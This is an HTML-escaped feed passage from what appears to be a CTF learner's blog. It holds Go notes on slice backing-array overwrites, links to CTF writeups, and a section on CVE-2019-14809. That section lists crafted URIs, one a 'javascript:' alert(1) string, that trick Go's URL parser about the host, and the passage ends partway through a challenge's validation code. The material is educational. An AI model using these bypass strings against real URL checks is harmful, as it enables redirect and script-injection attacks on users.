&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/encoder&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;file&amp;gt;&lt;/span>log/output.log&lt;span style="color:#f92672">&amp;lt;/file&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;rollingPolicy&lt;/span> &lt;span style="color:#75af00">class=&lt;/span>&lt;span style="color:#d88200">&amp;#34;ch.qos.logback.core.rolling.FixedWindowRollingPolicy&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;fileNamePattern&amp;gt;&lt;/span>log/output.log.%i&lt;span style="color:#f92672">&amp;lt;/fileNamePattern&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/rollingPolicy&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;triggeringPolicy&lt;/span> &lt;span style="color:#75af00">class=&lt;/span>&lt;span style="color:#d88200">&amp;#34;ch.qos.logback.core.rolling.SizeBasedTriggeringPolicy&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;MaxFileSize&amp;gt;&lt;/span>1MB&lt;span style="color:#f92672">&amp;lt;/MaxFileSize&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/triggeringPolicy&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/appender&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;root&lt;/span> &lt;span style="color:#75af00">level=&lt;/span>&lt;span style="color:#d88200">&amp;#34;INFO&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;appender-ref&lt;/span> &lt;span style="color:#75af00">ref=&lt;/span>&lt;span style="color:#d88200">&amp;#34;CONSOLE&amp;#34;&lt;/span> &lt;span style="color:#f92672">/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;appender-ref&lt;/span> &lt;span style="color:#75af00">ref=&lt;/span>&lt;span style="color:#d88200">&amp;#34;FILE&amp;#34;&lt;/span> &lt;span style="color:#f92672">/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/root&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;/configuration&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr>
&lt;p>学完基础语法的感觉是约等于同时复建了PHP+c+Python+NodeJS，虽说是速通，但是感觉触类旁通，很多东西都明白了（大概）&lt;/p>
&lt;p>6小时速通基础，今天就可以学反射和其它的高级用法了！就可以跟链子了！！！&lt;/p>
&lt;p>好耶！！！&lt;/p></description></item><item><title>Go学习笔记Ⅰ</title><link>https://amiaaaz.github.io/2022/02/26/go-study-notes-01/</link><pubDate>Sat, 26 Feb 2022 15:58:41 +0800</pubDate><guid>https://amiaaaz.github.io/2022/02/26/go-study-notes-01/</guid><description>&lt;h2 id="arrayslice-变量覆盖">array&amp;amp;slice 变量覆盖&lt;/h2>
&lt;blockquote>
&lt;p>A slice is a descriptor of an array segment. It consists of a pointer to the array, the length of the segment, and its capacity (the maximum length of the segment).&lt;/p>
&lt;/blockquote>
&lt;p>&lt;a href="https://go.dev/blog/slices-intro">Go Slices: usage and internals&lt;/a>（建议直接看官方文档，我这里简单写一下&lt;/p>
&lt;p>go中定义数组的基本操作是这样的&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">a&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75715e">// int型 4个元素
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">a&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#75715e">// 下标为1的元素值为1
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">a&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#75715e">// i == 1
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>基本类似于c的写法，数组变量代表整个数组，但是它并不是一个指向第一个数组元素的指针，所以说我们在操作数组中的值时实际上是在用它值的copy&lt;/p>
&lt;p>对于slice，既可以直接声明&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">letters&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">string&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;a&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;b&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;c&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;d&amp;#34;&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>也可以用内置的&lt;code>make&lt;/code>函数&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// func make([]T, len, cap) []T
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">s&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">s&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#111">make&lt;/span>&lt;span style="color:#111">([]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// s == []byte{0, 0, 0, 0, 0}
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>其中，&lt;code>[]T&lt;/code>表示type，&lt;code>len&lt;/code>表示长度，而第三个参数&lt;code>cap&lt;/code>是可以缺省的，默认等于length&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">s&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">make&lt;/span>&lt;span style="color:#111">([]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>关于slice的细节是我们关注的重点；它包含了一个指向数组的指针ptr，段的长度len，还有段的最大长度cap ————其实说到这里，如果有经验的已经能知道问题所在了&lt;/p>
&lt;p>&lt;img src="https://go.dev/blog/slices-intro/slice-struct.png" alt="img">&lt;/p>
&lt;p>以上面的&lt;code>s&lt;/code>为例（缺省cap），结构是这样的&lt;/p>
&lt;p>&lt;img src="https://go.dev/blog/slices-intro/slice-1.png" alt="img">&lt;/p>
&lt;p>当我们对&lt;code>s&lt;/code>进行切片操作&lt;code>s = s[2:4]&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://go.dev/blog/slices-intro/slice-2.png" alt="img">&lt;/p>
&lt;p>切片创建了一个新的slice（len和cap均不同），ptr仍指向原数组&lt;/p>
&lt;p>所以修改新的slice的元素会修改原始slice的值&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">d&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;o&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;a&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;d&amp;#39;&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">e&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">d&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">:]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// e == []byte{&amp;#39;a&amp;#39;, &amp;#39;d&amp;#39;}
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">e&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;m&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// e == []byte{&amp;#39;a&amp;#39;, &amp;#39;m&amp;#39;}
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// d == []byte{&amp;#39;r&amp;#39;, &amp;#39;o&amp;#39;, &amp;#39;a&amp;#39;, &amp;#39;m&amp;#39;}
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>元素的个数总是不能超过cap代表的上限，为了动态分配数组大小，我们有时会选择这样的操作&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">t&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">make&lt;/span>&lt;span style="color:#111">([]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">s&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cap&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">s&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// +1 in case cap(s) == 0
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#00a8c8">range&lt;/span> &lt;span style="color:#75af00">s&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">t&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">s&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">s&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">t&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>创建一个新的slice 并把原来的值复制进来，有一个内置函数可以直接做&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#111">copy&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">dst&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">src&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#75af00">T&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>copy允许传入length不同的两个slice，它会帮我们处理好可能存在的潜在问题，直接&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">t&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">make&lt;/span>&lt;span style="color:#111">([]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">s&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cap&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">s&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">copy&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">t&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">s&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">s&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">t&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>即可&lt;/p>
&lt;p>单纯向slice中添加元素可以使用内置函数&lt;code>append&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">s&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#75af00">T&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">x&lt;/span> &lt;span style="color:#f92672">...&lt;/span>&lt;span style="color:#75af00">T&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#75af00">T&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>当大于cap时它会自动调整，如果要append一个slice也是可以的&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">a&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">string&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;John&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;Paul&amp;#34;&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">b&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">string&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;George&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;Ringo&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;Pete&amp;#34;&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">a&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">a&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">b&lt;/span>&lt;span style="color:#f92672">...&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// equivalent to &amp;#34;append(a, b[0], b[1], b[2])&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// a == []string{&amp;#34;John&amp;#34;, &amp;#34;Paul&amp;#34;, &amp;#34;George&amp;#34;, &amp;#34;Ringo&amp;#34;, &amp;#34;Pete&amp;#34;}
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这分析了半天，终于到重点了）&lt;/p>
&lt;p>上面提到了，re-slicing a slice doesn&amp;rsquo;t make a copy of the underlying array, the full array will by kept in memory until it is no longer referenced&lt;/p>
&lt;p>举个例子&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#75af00">main&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;fmt&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">a&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">a&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">a&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">a&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">a&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">a&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">a&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">b&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">a&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">c&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">a&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Println&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">b&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">c&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>[1 1 1 3] [1 1 1 3]
&lt;/code>&lt;/pre>&lt;p>我们发现3之前的2被覆盖了&lt;/p>
&lt;p>假设当a数组在append一个元素时，ptr指向0x1(假设0x1为数组地址), len=1, cap=2；append第二个元素时ptr不变，len=2, cap=2；append第三个元素时容量不够了就会动态扩容，cap=4, len=3，所以ptr指向新的0x2&lt;/p>
&lt;p>此时ptr=0x2, len=3, cap=4，再append第四个元素也就是2的时候还不需要扩容，返回ptr=0x2, len=4, cap=4给b，但此时对于a而言len=3，相当于是添加元素然后另存为了，对原数组不影响，c也是一样的情况&lt;/p>
&lt;p>————不知道我有没有解释清楚QwQ&lt;/p>
&lt;h3 id="teaser-confidence-ctf-2019the-lottery">[Teaser CONFidence CTF 2019]The Lottery&lt;/h3>
&lt;p>参考：&lt;a href="https://github.com/mwarzynski/confidence2019_teaser_lottery">wp&lt;/a> | &lt;a href="https://blog.luckycat.moe/post/teaser-confidence-ctf-2019-the-lottery-writeup/">wp &lt;/a> | &lt;a href="https://ce-automne.github.io/2019/03/27/CONFidence%20-CTF-2019-The%20Lottery%20-WriteUp/">wp2&lt;/a>&lt;/p>
&lt;h3 id="roarctf-2019dist">[RoarCTF 2019]Dist&lt;/h3>
&lt;p>是上面那个题的改编&lt;/p>
&lt;p>参考：&lt;a href="https://blog.szfszf.top/tech/roarctf2019-web-writeup/">wp1&lt;/a>&lt;/p>
&lt;h2 id="cve-2019-14809-解析host">CVE-2019-14809 解析host&lt;/h2>
&lt;pre tabindex="0">&lt;code>javascript://%250aalert(1)+&amp;#39;aa@google.com/a&amp;#39;a
http://[google.com]:80
http://google.com]:80
http://google.com]:80__Anything_you&amp;#39;d_like_sir
http://[google.com]FreeTextZoneHere]:80
&lt;/code>&lt;/pre>&lt;p>由于net/url库的问题，这些URI解析出来Host都是google.com&lt;/p>
&lt;h3 id="某不知名题">某不知名题&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#75af00">main&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;fmt&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;io/ioutil&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;log&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;net/http&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;net/url&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;strings&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">SanCheck&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">input&lt;/span> &lt;span style="color:#00a8c8">string&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">error&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Parse&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">input&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">err&lt;/span>
